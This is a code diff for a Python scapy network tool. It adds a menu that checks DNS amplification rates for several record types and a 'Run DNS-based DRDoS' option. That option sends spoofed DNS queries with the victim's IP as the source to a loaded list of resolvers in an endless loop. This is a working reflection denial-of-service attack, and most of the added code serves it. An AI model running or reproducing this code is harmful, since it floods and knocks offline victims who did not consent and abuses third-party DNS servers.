@@ -1,13 +1,19 @@
-import os, sys, time, itertools
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+import os, sys, time, random, itertools
 import scapy.all as scapy
 from scapy.interfaces import NetworkInterface
+from scapy.all import *
+from scapy.all import UDP,DNS,DNSQR
+
 
 from .utils import *
 from .interface import NF_Interface
 
 
 class NF_DNSTool:
-    def __init__(self, interface: NetworkInterface): 
+    def __init__(self, interface: NetworkInterface):
         self.interface = interface
 
     #========================= MENUS =========================#
@@ -30,7 +36,9 @@ class NF_DNSTool:
  |   Interface: {selected} |{info}
  +-------------------------------------------------------------------+
  |                                                                   |
- |   No menu yet.                                                    |
+ |   (1) Check DNS Amplification Rate                                |
+ |                                                                   |
+ |   (2) Run DNS-based DRDoS                                         |
  |                                                                   |
  |   (0) Back to Main Menu                                           |
  |                                                                   |
@@ -47,6 +55,10 @@ class NF_DNSTool:
 
             if i == '0':
                 break
+            elif i == '1':
+                check_dns()
+            elif i == '2':
+                run_dns_drdos()
             else:
                 continue
 
@@ -55,4 +67,58 @@ class NF_DNSTool:
             except KeyboardInterrupt:
                 print()
             print_menu()
+
+
+
+def run_dns_drdos():
+    f = open("dns_servers.txt", 'r')
+    dns_servers = list(map(lambda x: x.strip(), f.readlines()))
+    f.close()
+
+    print(f'[+] DNS Server List Loaded! ({len(dns_servers)} servers)\n')
+    # print(dns_servers)
+
+    dns_query = input("[?] Enter DNS Query: ")
+    dns_type = input("[?] Enter DNS Type: ")
+    print()
+    target_ip = input("[?] Enter Target IP: ")
+    print()
+
+    try:
+        while True:
+            for server in dns_servers:
+                dns_payload = UDP(sport=RandShort(), dport=53) / DNS(rd=1,qd=DNSQR(qname=dns_query, qtype=dns_type))
+                ip_payload = IP(src=target_ip, dst=server) / dns_payload
+                send(ip_payload, verbose=0)
+            time.sleep(0.01)
+            print('[*] Sending DNS packets...')
+    except KeyboardInterrupt:
+        pass
+
+def calc_dns_amplification_rate(dns_query, type="A"):
+    dns_server = "8.8.8.8"
+    ans = None
+    while not ans:
+        dns_payload = scapy.UDP(sport=RandShort(), dport=53) / DNS(rd=1,qd=DNSQR(qname=dns_query, qtype=type))
+        ip_payload = IP(dst=dns_server) / dns_payload
+        ans = sr1(ip_payload, timeout=1, verbose=0)
+        time.sleep(0.5)
+    return (len(ans) + 14) / (len(ip_payload) + 14) # 14 for Ethernet Frame
+
+
+def check_dns():
+    try:
+        while True:
+            dns_query = input(">>> Enter DNS Query: ") or "ctldl.windowsupdate.com" # "www.google.com"
+            print()
+            print(f"Checking DNS records of {dns_query}")
+            print()
+            types = ["A", "AAAA", "CNAME", "MX", "TXT"]
+            for t in types:
+                amp = calc_dns_amplification_rate(dns_query, t)
+                print(f"Amplification Rate for '{t}' \t: {amp:.2f}")
+            print()
+            print()
+    except KeyboardInterrupt:
+        pass
 
